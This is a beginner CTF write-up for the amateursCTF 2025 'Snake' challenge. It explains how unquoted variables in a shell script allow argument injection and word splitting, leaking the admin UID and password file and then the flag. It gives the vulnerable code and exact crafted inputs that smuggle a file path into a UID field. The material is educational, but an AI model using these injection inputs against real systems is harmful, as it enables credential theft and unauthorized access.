# amateursCTF 2025 – Misc: Snake (Write‑up)

> Difficulty: beginner‑friendly misc / shell  
> Flag: `amateursCTF{y0u_ar3_th3_r3al_w1nn3r_0f_sn4k3}`

This is a small shell / logic challenge with a Snake game.  
The goal is to get into the **admin menu** and run the `flag` command, which uses the SUID binary `/readflag` to print `/flag.txt`.

We never need to crash anything or do complicated memory exploits.  
The whole challenge is about **bad shell quoting** and **abusing file paths**.

---

## 1. Files and what they do

Relevant files:

- `snake.sh` – the main game, runs the menus (register / login / snake / admin).
- `login.py` – checks if a UID + password is correct.
- `make_admin.py` – runs once at container start to create the **admin user**.
- `readflag` / `readflag.c` – SUID root helper that prints `/flag.txt`.
- `Dockerfile`, `run` – environment setup.

### 1.1 `make_admin.py`

```python
uid = secrets.randbits(48)
open('/srv/app/data/uids.txt', 'w').write(f'{uid}\n')
open(f'/srv/app/data/passwd/{uid}.txt', 'w').write(secrets.token_hex(16))
```

On each container start:

- It chooses a random 48‑bit number as the **admin UID**.
- It writes that UID as the **first line** of `/srv/app/data/uids.txt`.
- It writes a random **32‑hex‑character password** to `/srv/app/data/passwd/<admin_uid>.txt`.

So:

- First line of `uids.txt` = admin UID.
- File `passwd/<admin_uid>.txt` = admin password.

### 1.2 `login.py`

```python
uid = sys.argv[1]
password = sys.argv[2]
is_admin = False

with open('/srv/app/data/uids.txt') as f:
    uids = f.read().splitlines()
    if uid not in uids:
        sys.exit(1)

    if uid == uids[0]:
        is_admin = True

with open(f'/srv/app/data/passwd/{uid}.txt') as f:
    stored_password = f.read().strip()
    if password != stored_password:
        sys.exit(1)

if is_admin:
    sys.exit(255)
else:
    sys.exit(0)
```

Important points:

- It takes **exactly two** command line args: `uid` and `password`.
- If the UID is the **first line** in `uids.txt`, the user is **admin**.
- If password matches, exit code:
  - `0` = normal user.
  - `255` = admin.

### 1.3 `snake.sh` – relevant parts

#### Registration

```bash
register() {
    uid=$RANDOM$RANDOM$RANDOM
    echo UID: $uid
    echo -n "Password: " 
    read input_passwd

    echo $uid >> /srv/app/data/uids.txt
    echo -n $input_passwd > /srv/app/data/passwd/$uid.txt
    echo Registered!
}
```

- When you `register`, the script:
  - Picks a random UID.
  - Asks you for a password.
  - Appends your UID to `/srv/app/data/uids.txt`.
  - Saves your password in `/srv/app/data/passwd/<uid>.txt`.

**Important:** `input_passwd` is written **directly to the file**, no validation.  
So you can choose any password string you want, including things that *look like file paths*.

#### Login

```bash
login() {
    echo -n "UID: "
    read input_uid
    echo -n "Password: " 
    read input_passwd

    ./login.py $input_uid $input_passwd
    local login_status=$?
    if [ $login_status -eq 0 ] || [ $login_status -eq 255 ]; then
        uid=$input_uid
    fi
    return $login_status
}
```

Two bugs here:

1. The command is:
   ```bash
   ./login.py $input_uid $input_passwd
   ```
   **No quotes.**  
   If we put spaces in `input_uid` or `input_passwd`, the shell splits them into multiple arguments.

2. If login succeeds, the shell variable `uid` is set to **the whole string** we typed as `input_uid`, not just the numeric UID.

#### Score command in settings

Inside `user_menu`, the settings menu has:

```bash
score)
    echo -n "Your last score: "
    cat /srv/app/data/score/$uid.txt 2>/dev/null || echo 0
    ;;
```

Again:

- `/srv/app/data/score/$uid.txt` is **unquoted**, and `uid` may contain spaces.
- `cat` is run with `2>/dev/null`, and if it fails it will still print whatever it can, then `|| echo 0` runs and prints `0`.

This is exactly what we exploit.

---

## 2. Core idea of the exploit

We combine:

1. **Unquoted arguments** to `./login.py` in `login()`; and
2. **Unquoted `$uid`** in the `score` command.

The trick is:

1. When registering, pick a password that is a path, for example:
   - `/srv/app/data/uids`
   - or `/srv/app/data/passwd/<admin_uid>`
2. Later, when logging in, we give a specially crafted UID:
   - `"<our_uid> <that_path>"`

Because of the missing quotes:

- The shell runs:
  ```bash
  ./login.py <our_uid> <that_path> x
  ```
  if we typed password `x`.
- But `login.py` only looks at the **first two** arguments:
  - `uid = <our_uid>`
  - `password = <that_path>`
  - The `x` is ignored.
- This still passes authentication, because the stored password for `<our_uid>` **is exactly `<that_path>`** (we chose it).

After successful login, the script sets:

```bash
uid=$input_uid
```

So now `uid` becomes:

```text
"<our_uid> <that_path>"
```

Then, when we go to `settings -> score`, the script runs:

```bash
cat /srv/app/data/score/$uid.txt 2>/dev/null || echo 0
```

Because `$uid` has a space, the shell expands this as:

```bash
cat /srv/app/data/score/<our_uid>.txt <that_path>.txt 2>/dev/null || echo 0
```

- So **two files are read**:
  1. `/srv/app/data/score/<our_uid>.txt`
  2. `<that_path>.txt`
- If the first file doesn’t exist, `cat` still prints the content of the second, then returns error; `echo 0` prints a `0` afterwards, but our secret data is already visible.

By choosing `<that_path>` carefully, we can read:

1. `/srv/app/data/uids.txt` → leak the **admin UID**.
2. `/srv/app/data/passwd/<admin_uid>.txt` → leak the **admin password**.

Then we just log in as admin normally and use the `flag` command.

---

## 3. Step‑by‑step manual exploit (what to type)

Assume you are connected with:

```bash
nc amt.rs <PORT>
```

### Step 1 – Leak the admin UID from `uids.txt`

1. At the main menu, choose `register`:

   ```text
   > register
   UID: 122162738228091
   Password:
   ```

   - Write down that UID; call it `U1`.  
     Example: `U1 = 122162738228091`

2. For the password, type:

   ```text
   /srv/app/data/uids
   ```

   - Now your account’s stored password is literally the string `/srv/app/data/uids`.

3. You’re now in the user menu. Go into settings, then logout to create a score file:

   ```text
   > settings
   > logout
   ```

   This saves a score for you and returns to the main menu.

4. Back at the main menu, choose `login`:

   ```text
   > login
   UID:
   ```

   For the UID, enter:

   ```text
   122162738228091 /srv/app/data/uids
   ```

   (Replace the number with your actual `U1`.)

5. For `Password:`, type anything, e.g.:

   ```text
   x
   ```

   - The shell runs:  
     `./login.py 122162738228091 /srv/app/data/uids x`
   - `login.py` sees:
     - `uid = 122162738228091`
     - `password = /srv/app/data/uids`
     - Ignores `x`.
   - This matches the stored password, so login succeeds.

   The shell sets:

   ```bash
   uid="122162738228091 /srv/app/data/uids"
   ```

6. You’re now in the user menu again. Go to settings and then `score`:

   ```text
   > settings
   > score
   ```

   Output looks like:

   ```text
   Your last score: 25926016570130
   122162738228091
   0
   ```

   Explanation:

   - The command the shell actually ran was:
     ```bash
     cat /srv/app/data/score/122162738228091 /srv/app/data/uids.txt 2>/dev/null || echo 0
     ```
   - So:
     - The first line is your score file (score `1`, etc.).
     - The following lines come from `uids.txt`.

   The **first number** printed from `uids.txt` is the **admin UID**.  
   In this example:

   ```text
   admin_uid = 25926016570130
   ```

Write this `admin_uid` down.

---

### Step 2 – Leak the admin password from `passwd/<admin_uid>.txt`

Now we do basically the same trick again, with another user.

1. Back at the main menu, you can just type `register` again:

   ```text
   > register
   UID: 120042718718548
   Password:
   ```

   - Call this new UID `U2`.

2. For the password, now use the path to the admin’s password file:

   ```text
   /srv/app/data/passwd/25926016570130
   ```

   (Replace `25926016570130` with your actual `admin_uid`.)

3. You’re in the user menu. Go to settings, then logout (to follow the same flow):

   ```text
   > settings
   > logout
   ```

4. Back at main, login again:

   ```text
   > login
   UID:
   ```

   Enter:

   ```text
   120042718718548 /srv/app/data/passwd/25926016570130
   ```

5. For `Password:`, again type anything, e.g.:

   ```text
   x
   ```

   - Shell runs:  
     `./login.py 120042718718548 /srv/app/data/passwd/25926016570130 x`
   - `login.py` matches the stored password, login ok.
   - `uid` becomes:
     ```bash
     uid="120042718718548 /srv/app/data/passwd/25926016570130"
     ```

6. In the user menu:

   ```text
   > settings
   > score
   ```

   Now you get:

   ```text
   Your last score: e2f07347b1143424b0f6448697726c5a0
   ```

   The important part is the long hex string – this is the **admin password**.

   In the example above:

   ```text
   admin_pass = e2f07347b1143424b0f6448697726c5a
   ```

   (Note: the example challenge used 32 hex chars; when parsing programmatically we just grab the first 32 hex characters.)

---

### Step 3 – Login as admin and get the flag

Now we know:

- `admin_uid` (from Step 1), e.g. `25926016570130`
- `admin_pass` (from Step 2), e.g. `e2f07347b1143424b0f6448697726c5a`

From the main menu:

```text
> login
UID: 25926016570130
Password: e2f07347b1143424b0f6448697726c5a
```

Now `login.py` sees:

- `uid` = `25926016570130` (first line in `uids.txt` → admin)
- `password` matches `/srv/app/data/passwd/25926016570130.txt`
- So exit code is `255`, and `snake.sh` sends you into the **admin menu**:

```text
====================

🧸 Super Secret Admin Menu 🧸

====================
Commands:
  view_users - view all registered users
  flag       - get the flag
  logout     - logout of admin menu
```

Now just type:

```text
> flag
Flag: amateursCTF{y0u_ar3_th3_r3al_w1nn3r_0f_sn4k3}
```

And that’s the flag.

---

## 4. Summary (for unfriendly / new CTF players)

- This challenge is **not** about buffer overflows or ROP or crypto.
- It’s about:
  - **Unquoted variables in shell scripts**.
  - Using **paths as passwords**.
  - Making the program **cat two files at once** so we can read a file we shouldn’t.

Key mistakes in the code:

1. `./login.py $input_uid $input_passwd` (no quotes)  
   → we can inject extra arguments and make the Python script see exactly what we want.

2. `cat /srv/app/data/score/$uid.txt` (no quotes)  
   → if `uid` contains a space, it expands into **two file paths**, one of which we control.

By chaining both, we:

1. Force the score command to read `uids.txt` → get admin UID.
2. Force it again to read `passwd/<admin_uid>.txt` → get admin password.
3. Log in as admin and run `flag`.

If you remember just one lesson from this challenge:

> **Always quote your variables in shell (`"$var"`) unless you absolutely want word splitting.**  
> Here, forgetting the quotes gave us full access to the flag.

